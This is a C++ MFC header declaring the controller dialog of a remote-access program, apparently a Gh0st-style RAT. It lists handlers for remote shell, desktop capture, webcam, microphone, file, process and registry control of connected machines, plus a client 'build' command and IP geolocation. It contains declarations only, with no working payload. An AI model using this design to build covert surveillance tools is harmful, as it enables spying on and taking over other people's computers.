
// PCRemoteDlg.h: 头文件
//

#pragma once
#include"TrueColorToolBar.h"
#include"include/IOCPServer.h"
#include"SEU_QQwry.h"
// CPCRemoteDlg 对话框
class CPCRemoteDlg : public CDialogEx
{
// 构造
public:
	CPCRemoteDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_PCREMOTE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_CList_OnLine;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	// init list
	int InitList();
	// add list
	int AddList(CString strIP,CString strAddr,CString strPCName,CString strOS,CString strCPU,CString strVideo,CString strPing, ClientContext *pContext);
	// show message
	void ShowMessage(bool bIsOk,CString strMsg);
	void Test();
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegister();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainClose();
	afx_msg void OnMainSet();
	
	// 自定义消息
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnAddToList(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
protected:
	CStatusBar m_wndStatusBar;
public:
	// create status bar
	void CreateStatusBar();
protected:
	int iCount;
	CTrueColorToolBar m_ToolBar;
	NOTIFYICONDATA nid;
	SEU_QQwry *m_QQwry;
public:
	void CreateToolBar();
	afx_msg void OnNotifyClose();
	afx_msg void OnNotifyShow();
	afx_msg void OnClose();

protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	void Activate(UINT nPort, UINT nMaxConnection);
	static void ProcessReceiveComplete(ClientContext *pContext);
public:
	void ListenPort();
private:
	void SendSelectCommand(PBYTE pData, UINT nSize);
};
